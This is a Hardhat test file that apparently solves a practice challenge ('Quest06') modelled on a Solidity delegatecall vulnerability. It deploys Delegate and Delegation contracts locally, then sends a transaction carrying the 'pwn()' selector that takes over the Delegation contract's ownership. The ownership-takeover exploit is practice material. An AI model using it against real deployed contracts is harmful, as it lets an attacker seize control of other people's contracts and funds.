// use `--network ganacha` to test
import { expect } from "chai";
import { ethers } from "hardhat";

import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { Delegate, Delegation } from "../typechain";

describe("Quest06", function () {
  let owner: SignerWithAddress;
  let user1: SignerWithAddress;
  let delegate: Delegate;
  let delegation: Delegation;

  beforeEach(async () => {
    [owner, user1] = await ethers.getSigners();
  });

  describe("Deployments", () => {
    it("Should deploy Delegate with user1", async () => {
      const Delegate = await ethers.getContractFactory("Delegate", user1);
      delegate = await Delegate.deploy(user1.address);
      await delegate.deployed();

      console.log("delegate.address", delegate.address);

      expect(await delegate.owner()).to.equal(user1.address);
    });

    it("Should deploy Delegation with user1", async () => {
      const Delegation = await ethers.getContractFactory("Delegation", user1);
      delegation = await Delegation.deploy(delegate.address);
      await delegation.deployed();

      console.log("delegation.address", delegation.address);

      expect(await delegation.owner()).to.equal(user1.address);
    });
  });

  describe("Attack", () => {
    it("Should change Delegation to owner", async () => {
      const data = ethers.utils.solidityKeccak256(
        ["bytes"],
        [ethers.utils.toUtf8Bytes("pwn()")]
      );

      console.log("data:", data);

      const TX = await owner.sendTransaction({
        to: delegation.address,
        data: data,
      });
      await TX.wait();

      expect(await delegation.owner()).to.equal(owner.address);
    });
  });
});
